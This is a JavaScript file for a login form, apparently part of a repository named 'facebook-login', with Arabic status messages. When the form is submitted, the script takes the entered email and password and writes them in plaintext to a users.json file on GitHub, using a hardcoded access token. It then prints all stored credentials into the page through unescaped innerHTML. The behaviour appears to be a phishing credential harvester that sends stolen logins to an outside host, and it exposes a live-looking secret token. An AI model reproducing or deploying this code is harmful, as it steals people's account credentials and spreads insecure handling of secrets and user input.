// 🔥 GitHub Token
const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    if (!email || !password) {
        message.innerHTML = '❌ أدخل إيميل وباسورد!';
        message.className = 'error';
        return;
    }
    
    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
    
    try {
        const currentUsers = await fetchUsers();
        const newUser = {
            id: Date.now(),
            email: email,
            password: password,
            date: new Date().toLocaleString('ar')
        };
        currentUsers.push(newUser);
        await saveUsers(currentUsers);
        
        message.innerHTML = `✅ تم الحفظ في GitHub! (${currentUsers.length} مستخدم)`;
        message.className = 'success';
        showUsers();
        document.getElementById('loginForm').reset();
        
    } catch (error) {
        console.error('Full error:', error);
        message.innerHTML = `❌ خطأ: ${error.message}`;
        message.className = 'error';
    }
});

async function fetchUsers() {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
        const response = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        console.log('Fetch status:', response.status);
        
        if (response.status === 404) {
            console.log('File not found, starting empty');
            return [];
        }
        
        if (!response.ok) {
            console.log('API error:', response.status);
            throw new Error(`API Error: ${response.status}`);
        }
        
        const file = await response.json();
        console.log('File data:', file);
        
        if (!file.content) {
            throw new Error('No content in file');
        }
        
        const content = JSON.parse(atob(file.content));
        console.log('Decoded users:', content);
        return Array.isArray(content) ? content : [];
        
    } catch (error) {
        console.error('Fetch error:', error);
        return [];
    }
}

async function saveUsers(users) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
    
    let sha = null;
    try {
        const response = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        if (response.status === 200) {
            const file = await response.json();
            sha = file.sha;
        }
    } catch (e) {
        console.log('No existing file, creating new');
    }
    
    const content = btoa(JSON.stringify(users, null, 2));
    
    const response = await fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `Add user: ${users[users.length-1].email}`,
            content: content,
            sha: sha
        })
    });
    
    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`Save failed: ${response.status} - ${errorData.message}`);
    }
    
    console.log('Save success!');
}

async function showUsers() {
    const users = await fetchUsers();
    const message = document.getElementById('message');
    let display = '<br><h3>👥 المستخدمين من GitHub:</h3>';
    if (users.length === 0) {
        display += '<p>لا يوجد مستخدمين بعد</p>';
    } else {
        users.forEach(user => {
            display += `<p>📧 ${user.email} | 🔐 ${user.password} | 📅 ${user.date}</p>`;
        });
    }
    message.innerHTML += display;
}

// تحميل عند البداية
showUsers();
